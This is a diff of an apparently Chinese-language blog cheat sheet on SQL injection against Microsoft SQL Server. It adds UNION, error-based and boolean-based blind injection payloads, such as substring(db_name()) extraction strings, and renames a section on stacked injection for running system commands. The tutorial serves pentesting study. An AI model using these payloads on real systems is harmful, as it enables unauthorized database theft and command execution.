@@ -123,8 +123,8 @@
 <!--
  * @Author: reber
  * @Mail: 1070018473@qq.com
- * @Date: 2019-09-04 10:45:01
- * @LastEditTime: 2019-05-08 16:09:15
+ * @Date: 2018-09-04 10:45:01
+ * @LastEditTime: 2019-05-09 15:37:13
  -->
 
 <h3 id="0x00-基础信息探测">0x00 基础信息探测</h3>
@@ -154,11 +154,14 @@ ORIGINAL_LOGIN();
 --sa
 </code></pre>
 
-<h3 id="0x01-利用报错注入数据">0x01 利用报错注入数据</h3>
+<h3 id="0x01-union-query-error-based-注入">0x01 UNION query &amp; error-based 注入</h3>
 
 <ul>
 <li>判断存在注入</li>
 </ul>
+
+<pre><code>and 1=1/and 1=2
+</code></pre>
 
 <pre><code>select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end);
 
@@ -200,7 +203,16 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 <img src="/img/post/20180904-113720.png" alt="75" /></p></li>
 </ul>
 
-<h3 id="0x02-堆叠注入">0x02 堆叠注入</h3>
+<h3 id="0x02-boolean-based-blind-注入">0x02 boolean-based blind 注入</h3>
+
+<pre><code>?id=1 and substring(db_name(),1,1)='a' --
+?id=1 and substring(db_name(),1,1)='b' --
+</code></pre>
+
+<pre><code>?id=1 and unicode(substring((select db_name()),1,1))&gt;88 --
+</code></pre>
+
+<h3 id="0x03-stacked-注入">0x03 Stacked 注入</h3>
 
 <ul>
 <li>执行系统命令</li>
